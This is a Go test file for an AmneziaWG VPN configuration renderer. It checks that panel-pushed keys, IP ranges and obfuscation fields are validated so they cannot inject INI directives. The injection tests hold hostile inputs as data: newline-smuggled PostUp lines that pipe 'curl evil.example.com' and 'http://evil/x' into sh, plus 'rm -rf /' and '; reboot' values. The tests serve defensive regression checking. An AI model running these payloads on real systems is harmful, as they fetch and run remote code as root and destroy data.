package amneziawg

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Wave-14 #1: renderConfig now whitelists base64-32-byte WG keys to prevent
// INI injection (newlines / brackets in a panel-pushed key could smuggle a
// [Interface] PostUp=sh -c block and RCE awg-quick). Test fixtures need
// real-shape keys instead of placeholder strings. All-zero (priv) and
// 0x04-prefixed-zero (pub) are valid 32-byte base64.
const (
	testWGPrivKey  = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
	testWGPubKeyA  = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
	testWGPubKeyB  = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
	testWGPubKeyC  = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
)

func validInbound() InboundConfig {
	return InboundConfig{
		PrivateKey: testWGPrivKey,
		Address:    "10.66.66.1/24",
		Jc:         4, Jmin: 40, Jmax: 70,
		S1: 72, S2: 56, S3: 32, S4: 16,
		H1: 100, H2: 200, H3: 300, H4: 400,
	}
}

func TestInboundDefaults(t *testing.T) {
	// Pass an explicitly-zero InboundConfig, withDefaults() should fill
	// install-time fallbacks (Interface, ListenPort, PostUp/Down) but
	// MUST leave junk / magic-size / Address as-is (zero is a legitimate
	// "obfuscation off" value from the panel UI; the panel is always the
	// source of truth for those fields).
	cfg := (&InboundConfig{}).withDefaults()
	if cfg.Interface != "awg0" {
		t.Errorf("Interface default: got %q", cfg.Interface)
	}
	if cfg.ListenPort != 51820 {
		t.Errorf("ListenPort default: got %d", cfg.ListenPort)
	}
	if cfg.Jc != 0 || cfg.Jmin != 0 || cfg.Jmax != 0 {
		t.Errorf("Jc/Jmin/Jmax should remain zero, got %d/%d/%d", cfg.Jc, cfg.Jmin, cfg.Jmax)
	}
	if cfg.S1 != 0 || cfg.S2 != 0 || cfg.S3 != 0 || cfg.S4 != 0 {
		t.Errorf("S1-S4 should remain zero, got %d/%d/%d/%d", cfg.S1, cfg.S2, cfg.S3, cfg.S4)
	}
	if cfg.Address != "" {
		t.Errorf("Address should remain empty, got %q", cfg.Address)
	}
	if !strings.Contains(cfg.PostUp, "MASQUERADE") {
		t.Errorf("PostUp default missing MASQUERADE: %q", cfg.PostUp)
	}
}

func TestInboundValidation(t *testing.T) {
	cases := []struct {
		name    string
		mutate  func(*InboundConfig)
		wantErr string
	}{
		{"missing private key", func(c *InboundConfig) { c.PrivateKey = "" }, "PrivateKey"},
		{"H1 zero", func(c *InboundConfig) { c.H1 = 0 }, "H1"},
		{"H3 collides with WG default", func(c *InboundConfig) { c.H3 = 3 }, "H3"},
		{"H1 == H2", func(c *InboundConfig) { c.H1 = c.H2 }, "distinct"},
		{"Jmin > Jmax", func(c *InboundConfig) { c.Jmin = 200; c.Jmax = 100 }, "Jmin"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cfg := validInbound()
			tc.mutate(&cfg)
			err := cfg.validate()
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Errorf("validate: got %v, want error containing %q", err, tc.wantErr)
			}
		})
	}
}

func TestRenderConfigInterfaceBlock(t *testing.T) {
	out, err := renderConfig(validInbound(), nil)
	if err != nil {
		t.Fatalf("renderConfig: %v", err)
	}
	for _, want := range []string{
		"[Interface]",
		"PrivateKey = " + testWGPrivKey,
		"ListenPort = 51820",
		"Address = 10.66.66.1/24",
		"Jc = 4",
		"S1 = 72",
		"H1 = 100",
		"H4 = 400",
		"PostUp = iptables",
		"PostDown = iptables",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("rendered config missing %q. Output:\n%s", want, out)
		}
	}
	// No peers → no [Peer] sections.
	if strings.Contains(out, "[Peer]") {
		t.Errorf("expected no [Peer] block when peer list empty, got:\n%s", out)
	}
}

func TestRenderConfigPeers(t *testing.T) {
	peers := []Peer{
		{PublicKey: testWGPubKeyA, AllowedIP: "10.0.0.2/32"},
		{PublicKey: testWGPubKeyB, AllowedIP: "10.0.0.3/32"},
	}
	out, err := renderConfig(validInbound(), peers)
	if err != nil {
		t.Fatalf("renderConfig: %v", err)
	}
	if strings.Count(out, "[Peer]") != 2 {
		t.Errorf("expected 2 [Peer] blocks, got %d. Output:\n%s", strings.Count(out, "[Peer]"), out)
	}
	for _, want := range []string{
		"PublicKey = " + testWGPubKeyA,
		"AllowedIPs = 10.0.0.2/32",
		"PublicKey = " + testWGPubKeyB,
		"AllowedIPs = 10.0.0.3/32",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
}

func TestRenderConfigRejectsEmptyPeerFields(t *testing.T) {
	peers := []Peer{{PublicKey: "", AllowedIP: "10.0.0.2/32"}}
	if _, err := renderConfig(validInbound(), peers); err == nil {
		t.Errorf("expected error for empty PublicKey")
	}
}

// Wave-14 #1 regression, renderConfig must reject any panel-pushed peer
// field that could break out of [Peer] and inject [Interface]/PostUp shell
// commands (RCE-as-root via awg-quick). Whitelisted formats: 44-char base64
// WG keys, valid CIDR strings.
func TestRenderConfigRejectsInjectedPeerFields(t *testing.T) {
	cases := []struct {
		name      string
		publicKey string
		allowedIP string
	}{
		{"newline in PublicKey", "AAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "10.0.0.2/32"},
		{"PublicKey too short", "AAAA", "10.0.0.2/32"},
		{"shell metachar in PublicKey", "AAAA;rm -rf /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "10.0.0.2/32"},
		{"newline in AllowedIP", testWGPubKeyA, "10.0.0.2/32\n[Interface]"},
		{"AllowedIP not CIDR", testWGPubKeyA, "10.0.0.2"},
		{"AllowedIP shell injection", testWGPubKeyA, "10.0.0.2/32; reboot"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			peers := []Peer{{PublicKey: tc.publicKey, AllowedIP: tc.allowedIP}}
			if _, err := renderConfig(validInbound(), peers); err == nil {
				t.Errorf("expected validation error for malicious peer field")
			}
		})
	}
}

func TestRenderConfigRejectsInjectedPrivateKey(t *testing.T) {
	cfg := validInbound()
	cfg.PrivateKey = "AAAA\n[Interface]\nPostUp = sh -c 'curl evil.example.com|sh'\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAA="
	if _, err := renderConfig(cfg, nil); err == nil {
		t.Errorf("expected validation error for newline-injected PrivateKey")
	}
}

// renderConfig must reject any panel-pushed I1-I5 mimicry value that isn't a
// plain hex string, closing the same [Interface]/PostUp injection → root-RCE
// class the WG-key/AllowedIP validators guard against. I-fields are written
// verbatim into the awg-quick INI, so a newline lets a value inject a PostUp
// directive that runs as root on `awg-quick up`.
func TestRenderConfigRejectsInjectedIField(t *testing.T) {
	cases := []struct {
		name string
		i1   string
	}{
		{"newline injecting PostUp", "aabb\nPostUp = curl http://evil/x | sh"},
		{"shell metachar", "aabb; reboot"},
		{"space then directive", "aabb ListenPort = 9"},
		{"non-hex letter", "aabbzz"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cfg := validInbound()
			cfg.I1 = tc.i1
			if _, err := renderConfig(cfg, nil); err == nil {
				t.Errorf("expected validation error for malicious I1 value")
			}
		})
	}
}

// A well-formed hex I-value (and empty = disabled) must still render.
func TestRenderConfigAcceptsHexIField(t *testing.T) {
	cfg := validInbound()
	cfg.I1 = "b0000000c1600000456"
	cfg.I5 = ""
	if _, err := renderConfig(cfg, nil); err != nil {
		t.Errorf("valid hex I-field rejected: %v", err)
	}
}

func TestRenderConfigPropagatesValidationError(t *testing.T) {
	bad := validInbound()
	bad.PrivateKey = ""
	if _, err := renderConfig(bad, nil); err == nil {
		t.Errorf("expected validation error to propagate")
	}
}

func TestWriteConfigAtomic(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "etc", "amneziawg", "awg0.conf")
	blob := "[Interface]\nPrivateKey = secret\n"
	if err := writeConfig(path, blob); err != nil {
		t.Fatalf("writeConfig: %v", err)
	}
	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if string(got) != blob {
		t.Errorf("content mismatch: got %q want %q", string(got), blob)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if mode := info.Mode().Perm(); mode != 0o600 {
		t.Errorf("expected 0600 perms (config holds private key), got %o", mode)
	}
	if _, err := os.Stat(path + ".tmp"); !os.IsNotExist(err) {
		t.Errorf("temp file lingered: %v", err)
	}
}
